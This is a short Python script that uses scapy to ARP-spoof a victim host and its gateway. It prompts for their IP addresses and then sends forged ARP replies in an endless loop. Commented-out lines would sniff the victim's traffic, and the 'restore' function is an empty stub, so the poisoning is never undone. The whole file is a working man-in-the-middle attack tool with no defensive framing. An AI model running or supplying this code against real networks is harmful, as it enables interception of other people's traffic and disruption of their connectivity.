from scapy.all import *
import os
import sys
import time

def sp(vfrom, vto, vtohw):
    arps = ARP()
    arps.psrc = vfrom
    arps.pdst = vto
    arps.hwdst = vtohw
    arps.op = 2
    send(arps, verbose=False)
    print('ARP SENT FROM ' + vfrom + ' TO ' + vto + ' ' + vtohw)
    
def spoof(victim, gateway):
    arps1 = ARP(pdst=victim)
    arps2 = ARP(pdst=gateway)
    r1 = sr1(arps1, verbose=False, timeout=3)
    r2 = sr1(arps2, verbose=False, timeout=3)
    if r1 != None and r2 != None:
        hw1 = r1.hwsrc
        hw2 = r2.hwsrc
        sp(gateway, victim, hw1)
        sp(victim, gateway, hw2)
        print('TARGET SPOOFED !')
    
def restore(victim, gateway):
    print()
    
v = str(input('ENTER VICTIM IP ADDRESS : '))
g = str(input('ENTER GATEWAY : '))
c = str(input(v+'> '))

try:
   while True:
       spoof(v, g)
       #conf.sniff_promisc = True
       #ss = sniff(filter='ip dst '+v, count=5)
       #for s in ss:
       #    print(str(s))
       time.sleep(6)
except Exception as e:
    print('THE PROBLEM IS : ' + e)